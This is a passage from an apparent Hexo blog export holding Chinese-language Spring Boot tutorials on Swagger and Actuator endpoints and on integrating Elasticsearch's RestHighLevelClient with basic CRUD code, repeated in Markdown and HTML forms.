test4(@RequestParam(&quot;username&quot;) String username,</span><br><span class=\"line\">                        @RequestParam(&quot;password&quot;) String passwprd)&#123;</span><br><span class=\"line\">       return username + &quot;:&quot; + passwprd;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试restful类型接口&quot;, notes = &quot;测试restful类型接口&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test5/&#123;name&#125;&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span><br><span class=\"line\">    public String test5(@PathVariable(&quot;name&quot;) String name,</span><br><span class=\"line\">                        @RequestParam(&quot;username&quot;) String username)&#123;</span><br><span class=\"line\">        return name + &quot; : &quot; + username;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>访问:<a href=\"http://127.0.0.1:8080/swagger-ui.html\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/swagger-ui.html</a></p>\n<h4 id=\"3-Health\"><a href=\"#3-Health\" class=\"headerlink\" title=\"3.Health\"></a>3.Health</h4><p>这是2.0版本：<a href=\"https://blog.csdn.net/alinyua/article/details/80009435\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/alinyua/article/details/80009435</a><br><br>可以直观的看到自己CPU的利用率、内存的利用率、数据库连接是否正常等信息</p>\n<ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;!--&lt;version&gt;2.1.0.RELEASE&lt;/version&gt;--&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Springboot2版本需要在application.properties加入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">management.endpoints.web.exposure.include=*</span><br><span class=\"line\">#显示所有健康状态，需要加配置</span><br><span class=\"line\">management.endpoint.health.show-details=always</span><br></pre></td></tr></table></figure>\n<p>内置EndPoints：</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1:8080/actuator\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator</a><br><br><a href=\"http://127.0.0.1:8080/actuator/health\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/health</a><br><br><a href=\"http://127.0.0.1:8080/actuator/info\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/info</a><br><br><a href=\"http://127.0.0.1:8080/actuator/beans\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/beans</a><br><br><a href=\"http://127.0.0.1:8080/actuator/httptrace\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/httptrace</a></p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"4-Eureka\"><a href=\"#4-Eureka\" class=\"headerlink\" title=\"4.Eureka\"></a>4.Eureka</h4>"},{"title":"springboot 整合 es 的RestHighLevelClient","date":"2019-07-16T22:55:31.000Z","_content":"\n### 一.整合\n\n#### 1.maven\n\n尽量和自己的Es版本一致，或者稍微大于es版本，防止功能不兼容。\n```\n<dependency>\n   <groupId>org.elasticsearch.client</groupId>\n   <artifactId>elasticsearch-rest-high-level-client</artifactId>\n   <version>6.6.2</version>\n</dependency>\n\n<dependency>\n   <groupId>org.elasticsearch</groupId>\n   <artifactId>elasticsearch</artifactId>\n   <version>6.6.2</version>\n</dependency>\n```\n#### 2.RestHighLevelClient 配置类\n\nRestHighLevelClient也需要一个RestClient.\n```\n/**\n * RestHighLevelClient配置类\n */\n@Component\npublic class EsRestHighLevelClient {\n\n  private static String[] ips;\n  private static int[] ports;\n  @Value(\"${risk.es.ips}\")\n  public void setIps(String[] ip){\n      ips = ip;\n  }\n  @Value(\"${risk.es.ports}\")\n  public void setPorts(int[] port){\n      ports = port;\n  }\n\n\n  public RestHighLevelClient getClient(){\n      HttpHost[] httpHosts = new HttpHost[ips.length];\n      for(int i=0; i<ips.length; i++){\n          httpHosts[i] = new HttpHost(ips[i], ports[i], \"http\");\n      }\n      RestHighLevelClient client = new RestHighLevelClient(RestClient.builder(httpHosts));\n      return client;\n  }\n}\n\n```\n\n#### 3.基本CURD\n\n<details>\n<summary> Curd </summary>\n\n```\n@Component\npublic class EsCurdOptions {\n\n    @Autowired\n    EsRestHighLevelClient esRestHighLevelClient;\n\n    private static final String Index = \"accounts\";\n\n    private static final String Type = \"company\";\n\n    //用来做id的key\n    private static final String Key = \"qiyemingcheng\";\n\n    /**\n     * 增\n     * 以key属性字段作为id\n     * @param map\n     */\n    public void add(Map <String,Object> map){\n\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n        IndexRequest indexRequest = new IndexRequest(Index,Type, map.get(\"key\").toString());\n        indexRequest.source(map);\n\n        try {\n            IndexResponse response =  client.index(indexRequest, RequestOptions.DEFAULT);\n            System.out.println(response.toString());\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * 批量添加\n     * 添加在 Index --> Type 下\n     * @param list\n     */\n    public void bulkAdd(List<Map<String,Object>> list){\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n\n        BulkRequest bulkRequest = new BulkRequest(Index, Type);\n        for(Map<String, Object> map: list){\n            IndexRequest indexRequest = new IndexRequest(Index,Type, map.get(Key).toString());\n            bulkRequest.add(indexRequest.source(map));\n        }\n        try {\n            client.bulkAsync(bulkRequest, RequestOptions.DEFAULT, new ActionListener<BulkResponse>() {\n                @Override\n                public void onResponse(BulkResponse bulkItemResponses) {\n                    for(BulkItemResponse response: bulkItemResponses){\n                        System.out.println(response.status());\n                    }\n                }\n\n                @Override\n                public void onFailure(Exception e) {\n                    System.out.println(\"批量失败\");\n                }\n            });\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n    /**\n     * 查\n     * 在企业名称属性中查找\n     * 模糊\n     * @param key\n     */\n    public List<Map<String,Object>> search(String key){\n        List<Map<String,Object>> list = new ArrayList<>();\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n        //index\n        SearchRequest request = new SearchRequest(Index);\n\n        //type\n        request.types(Type);\n        RequestOptions options = RequestOptions.DEFAULT;\n        //source\n        SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();\n        sourceBuilder.from(0);\n        sourceBuilder.size(10);\n        MatchQueryBuilder matchQueryBuilder = new MatchQueryBuilder(\"qiyemingcheng\",key);\n        matchQueryBuilder.fuzziness(Fuzziness.AUTO);\n        sourceBuilder.query(matchQueryBuilder);\n        request.source(sourceBuilder);\n        try{\n            SearchResponse response = client.search(request,options);\n            System.out.println(response.toString());\n            SearchHits hits = response.getHits();\n            SearchHit[] hits1 = hits.getHits();\n            for (SearchHit hit : hits1) {\n                Map<String, Object> map = hit.getSourceAsMap();\n                list.add(map);\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return list;\n    }\n\n\n    /**\n     * 查询type下所有记录\n     * 有个问题  默认有分页信息  返回的数据为分页size\n     * 如果 size设置过大 数据太大\n     * @return\n     */\n    public List searchType(){\n        List<String> list = new ArrayList<>();\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n\n        SearchRequest searchRequest = new SearchRequest(Index);\n        searchRequest.types(Type);\n        SearchSourceBuilder sourceBuilder  = new SearchSourceBuilder();\n        sourceBuilder.from(0);\n        //sourceBuilder.size(1000);\n        QueryBuilder queryBuilder = new MatchAllQueryBuilder();\n        sourceBuilder.query(queryBuilder);\n        searchRequest.source(sourceBuilder);\n        try {\n            SearchResponse response = client.search(searchRequest, RequestOptions.DEFAULT);\n            SearchHits hits = response.getHits();\n            SearchHit[] hits1 = hits.getHits();\n            for (SearchHit hit : hits1) {\n\n                list.add(hit.getId());\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return list;\n    }\n    /**\n     * 获取指定id下的数据\n     * 精确\n     * @param key\n     */\n    public Map get(String key){\n        Map<String,Object> map = new HashMap<>();\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n\n        GetRequest getRequest = new GetRequest(Index, Type, key);\n        try {\n            GetResponse response = client.get(getRequest, RequestOptions.DEFAULT);\n            map = response.getSourceAsMap();\n            System.out.println(response.toString());\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return map;\n    }\n\n    /**\n     * 删\n     * 删除指定id的数据\n     * @param key\n     */\n    public void  delete(String key){\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n        DeleteRequest deleteRequest = new DeleteRequest(Index, Type, key);\n        try{\n            DeleteResponse response = client.delete(deleteRequest,RequestOptions.DEFAULT);\n            System.out.println(response.toString());\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * 删除type下所有文档\n     * 先查询 再删除\n     */\n    public void deleteType(){\n        List<String> list = searchType();\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n\n        try{\n            for(String id: list){\n                DeleteRequest deleteRequest = new DeleteRequest(Index,Type, id);\n                client.delete(deleteRequest,RequestOptions.DEFAULT);\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * 更新指定id下的数据\n     * key为id的值\n     * @param key\n     * @param map\n     */\n    public void update(String key, Map<String,Object> map){\n\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n\n        UpdateRequest updateRequest = new UpdateRequest(Index,Type,key);\n        IndexRequest indexRequest = new IndexRequest().source(map);\n        updateRequest.doc(indexRequest);\n\n        try{\n            UpdateResponse response = client.update(updateRequest, RequestOptions.DEFAULT);\n            System.out.println(response.toString());\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n}\n\n```\n</details>\n\n### 二.Es一些基本知识\n\n#### 1.Es中文档数据例子\nindex+type+id可以确定一个唯一文档\n```\n{\n  \"_index\" :   \"megacorp\",\n  \"_type\" :    \"employee\",\n  \"_id\" :      \"1\",\n  \"_version\" : 1,\n  \"found\" :    true,\n  \"_source\" :  {\n      \"first_name\" :  \"John\",\n      \"last_name\" :   \"Smith\",\n      \"age\" :         25,\n      \"about\" :       \"I love to go rock climbing\",\n      \"interests\":  [ \"sports\", \"music\" ]\n    }\n}\n```\n\n>_index -- 索引名称<br>\n>_type -- 类型名称<br>\n>_id -- id(这个id可以自己指定也可以自动生成)<br>\n>_version -- 版本号,每次改动会+1<br>\n>found -- true表示在document存在<br>\n>_source -- document的全部内容<br>\n","source":"_posts/tools/springboot整合es.md","raw":"---\ntitle: springboot 整合 es 的RestHighLevelClient\ndate: 2019-07-16 18:55:31\ntags: [tools]\n---\n\n### 一.整合\n\n#### 1.maven\n\n尽量和自己的Es版本一致，或者稍微大于es版本，防止功能不兼容。\n```\n<dependency>\n   <groupId>org.elasticsearch.client</groupId>\n   <artifactId>elasticsearch-rest-high-level-client</artifactId>\n   <version>6.6.2</version>\n</dependency>\n\n<dependency>\n   <groupId>org.elasticsearch</groupId>\n   <artifactId>elasticsearch</artifactId>\n   <version>6.6.2</version>\n</dependency>\n```\n#### 2.RestHighLevelClient 配置类\n\nRestHighLevelClient也需要一个RestClient.\n```\n/**\n * RestHighLevelClient配置类\n */\n@Component\npublic class EsRestHighLevelClient {\n\n  private static String[] ips;\n  private static int[] ports;\n  @Value(\"${risk.es.ips}\")\n  public void setIps(String[] ip){\n      ips = ip;\n  }\n  @Value(\"${risk.es.ports}\")\n  public void setPorts(int[] port){\n      ports = port;\n  }\n\n\n  public RestHighLevelClient getClient(){\n      HttpHost[] httpHosts = new HttpHost[ips.length];\n      for(int i=0; i<ips.length; i++){\n          httpHosts[i] = new HttpHost(ips[i], ports[i], \"http\");\n      }\n      RestHighLevelClient client = new RestHighLevelClient(RestClient.builder(httpHosts));\n      return client;\n  }\n}\n\n```\n\n#### 3.基本CURD\n\n<details>\n<summary> Curd </summary>\n\n```\n@Component\npublic class EsCurdOptions {\n\n    @Autowired\n    EsRestHighLevelClient esRestHighLevelClient;\n\n    private static final String Index = \"accounts\";\n\n    private static final String Type = \"company\";\n\n    //用来做id的key\n    private static final String Key = \"qiyemingcheng\";\n\n    /**\n     * 增\n     * 以key属性字段作为id\n     * @param map\n     */\n    public void add(Map <String,Object> map){\n\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n        IndexRequest indexRequest = new IndexRequest(Index,Type, map.get(\"key\").toString());\n        indexRequest.source(map);\n\n        try {\n            IndexResponse response =  client.index(indexRequest, RequestOptions.DEFAULT);\n            System.out.println(response.toString());\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * 批量添加\n     * 添加在 Index --> Type 下\n     * @param list\n     */\n    public void bulkAdd(List<Map<String,Object>> list){\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n\n        BulkRequest bulkRequest = new BulkRequest(Index, Type);\n        for(Map<String, Object> map: list){\n            IndexRequest indexRequest = new IndexRequest(Index,Type, map.get(Key).toString());\n            bulkRequest.add(indexRequest.source(map));\n        }\n        try {\n            client.bulkAsync(bulkRequest, RequestOptions.DEFAULT, new ActionListener<BulkResponse>() {\n                @Override\n                public void onResponse(BulkResponse bulkItemResponses) {\n                    for(BulkItemResponse response: bulkItemResponses){\n                        System.out.println(response.status());\n                    }\n                }\n\n                @Override\n                public void onFailure(Exception e) {\n                    System.out.println(\"批量失败\");\n                }\n            });\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n    /**\n     * 查\n     * 在企业名称属性中查找\n     * 模糊\n     * @param key\n     */\n    public List<Map<String,Object>> search(String key){\n        List<Map<String,Object>> list = new ArrayList<>();\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n        //index\n        SearchRequest request = new SearchRequest(Index);\n\n        //type\n        request.types(Type);\n        RequestOptions options = RequestOptions.DEFAULT;\n        //source\n        SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();\n        sourceBuilder.from(0);\n        sourceBuilder.size(10);\n        MatchQueryBuilder matchQueryBuilder = new MatchQueryBuilder(\"qiyemingcheng\",key);\n        matchQueryBuilder.fuzziness(Fuzziness.AUTO);\n        sourceBuilder.query(matchQueryBuilder);\n        request.source(sourceBuilder);\n        try{\n            SearchResponse response = client.search(request,options);\n            System.out.println(response.toString());\n            SearchHits hits = response.getHits();\n            SearchHit[] hits1 = hits.getHits();\n            for (SearchHit hit : hits1) {\n                Map<String, Object> map = hit.getSourceAsMap();\n                list.add(map);\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return list;\n    }\n\n\n    /**\n     * 查询type下所有记录\n     * 有个问题  默认有分页信息  返回的数据为分页size\n     * 如果 size设置过大 数据太大\n     * @return\n     */\n    public List searchType(){\n        List<String> list = new ArrayList<>();\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n\n        SearchRequest searchRequest = new SearchRequest(Index);\n        searchRequest.types(Type);\n        SearchSourceBuilder sourceBuilder  = new SearchSourceBuilder();\n        sourceBuilder.from(0);\n        //sourceBuilder.size(1000);\n        QueryBuilder queryBuilder = new MatchAllQueryBuilder();\n        sourceBuilder.query(queryBuilder);\n        searchRequest.source(sourceBuilder);\n        try {\n            SearchResponse response = client.search(searchRequest, RequestOptions.DEFAULT);\n            SearchHits hits = response.getHits();\n            SearchHit[] hits1 = hits.getHits();\n            for (SearchHit hit : hits1) {\n\n                list.add(hit.getId());\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return list;\n    }\n    /**\n     * 获取指定id下的数据\n     * 精确\n     * @param key\n     */\n    public Map get(String key){\n        Map<String,Object> map = new HashMap<>();\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n\n        GetRequest getRequest = new GetRequest(Index, Type, key);\n        try {\n            GetResponse response = client.get(getRequest, RequestOptions.DEFAULT);\n            map = response.getSourceAsMap();\n            System.out.println(response.toString());\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return map;\n    }\n\n    /**\n     * 删\n     * 删除指定id的数据\n     * @param key\n     */\n    public void  delete(String key){\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n        DeleteRequest deleteRequest = new DeleteRequest(Index, Type, key);\n        try{\n            DeleteResponse response = client.delete(deleteRequest,RequestOptions.DEFAULT);\n            System.out.println(response.toString());\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * 删除type下所有文档\n     * 先查询 再删除\n     */\n    public void deleteType(){\n        List<String> list = searchType();\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n\n        try{\n            for(String id: list){\n                DeleteRequest deleteRequest = new DeleteRequest(Index,Type, id);\n                client.delete(deleteRequest,RequestOptions.DEFAULT);\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * 更新指定id下的数据\n     * key为id的值\n     * @param key\n     * @param map\n     */\n    public void update(String key, Map<String,Object> map){\n\n        RestHighLevelClient client = esRestHighLevelClient.getClient();\n\n        UpdateRequest updateRequest = new UpdateRequest(Index,Type,key);\n        IndexRequest indexRequest = new IndexRequest().source(map);\n        updateRequest.doc(indexRequest);\n\n        try{\n            UpdateResponse response = client.update(updateRequest, RequestOptions.DEFAULT);\n            System.out.println(response.toString());\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n}\n\n```\n</details>\n\n### 二.Es一些基本知识\n\n#### 1.Es中文档数据例子\nindex+type+id可以确定一个唯一文档\n```\n{\n  \"_index\" :   \"megacorp\",\n  \"_type\" :    \"employee\",\n  \"_id\" :      \"1\",\n  \"_version\" : 1,\n  \"found\" :    true,\n  \"_source\" :  {\n      \"first_name\" :  \"John\",\n      \"last_name\" :   \"Smith\",\n      \"age\" :         25,\n      \"about\" :       \"I love to go rock climbing\",\n      \"interests\":  [ \"sports\", \"music\" ]\n    }\n}\n```\n\n>_index -- 索引名称<br>\n>_type -- 类型名称<br>\n>_id -- id(这个id可以自己指定也可以自动生成)<br>\n>_version -- 版本号,每次改动会+1<br>\n>found -- true表示在document存在<br>\n>_source -- document的全部内容<br>\n","slug":"tools/springboot整合es","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321j2003g6dcpfbmpn5z0","content":"<h3 id=\"一-整合\"><a href=\"#一-整合\" class=\"headerlink\" title=\"一.整合\"></a>一.整合</h3><h4 id=\"1-maven\"><a href=\"#1-maven\" class=\"headerlink\" title=\"1.maven\"></a>1.maven</h4><p>尽量和自己的Es版本一致，或者稍微大于es版本，防止功能不兼容。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">   &lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt;</span><br><span class=\"line\">   &lt;artifactId&gt;elasticsearch-rest-high-level-client&lt;/artifactId&gt;</span><br><span class=\"line\">   &lt;version&gt;6.6.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">   &lt;groupId&gt;org.elasticsearch&lt;/groupId&gt;</span><br><span class=\"line\">   &lt;artifactId&gt;elasticsearch&lt;/artifactId&gt;</span><br><span class=\"line\">   &lt;version&gt;6.6.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2-RestHighLevelClient-配置类\"><a href=\"#2-RestHighLevelClient-配置类\" class=\"headerlink\" title=\"2.RestHighLevelClient 配置类\"></a>2.RestHighLevelClient 配置类</h4><p>RestHighLevelClient也需要一个RestClient.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * RestHighLevelClient配置类</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class EsRestHighLevelClient &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  private static String[] ips;</span><br><span class=\"line\">  private static int[] ports;</span><br><span class=\"line\">  @Value(&quot;$&#123;risk.es.ips&#125;&quot;)</span><br><span class=\"line\">  public void setIps(String[] ip)&#123;</span><br><span class=\"line\">      ips = ip;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  @Value(&quot;$&#123;risk.es.ports&#125;&quot;)</span><br><span class=\"line\">  public void setPorts(int[] port)&#123;</span><br><span class=\"line\">      ports = port;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  public RestHighLevelClient getClient()&#123;</span><br><span class=\"line\">      HttpHost[] httpHosts = new HttpHost[ips.length];</span><br><span class=\"line\">      for(int i=0; i&lt;ips.length; i++)&#123;</span><br><span class=\"line\">          httpHosts[i] = new HttpHost(ips[i], ports[i], &quot;http&quot;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      RestHighLevelClient client = new RestHighLevelClient(RestClient.builder(httpHosts));</span><br><span class=\"line\">      return client;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"3-基本CURD\"><a href=\"#3-基本CURD\" class=\"headerlink\" title=\"3.基本CURD\"></a>3.基本CURD</h4><details><br><summary> Curd </summary><br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Component</span><br><span class=\"line\">public class EsCurdOptions &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    EsRestHighLevelClient esRestHighLevelClient;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static final String Index = &quot;accounts&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static final String Type = &quot;company&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //用来做id的key</span><br><span class=\"line\">    private static final String Key = &quot;qiyemingcheng&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 增</span><br><span class=\"line\">     * 以key属性字段作为id</span><br><span class=\"line\">     * @param map</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public void add(Map &lt;String,Object&gt; map)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span 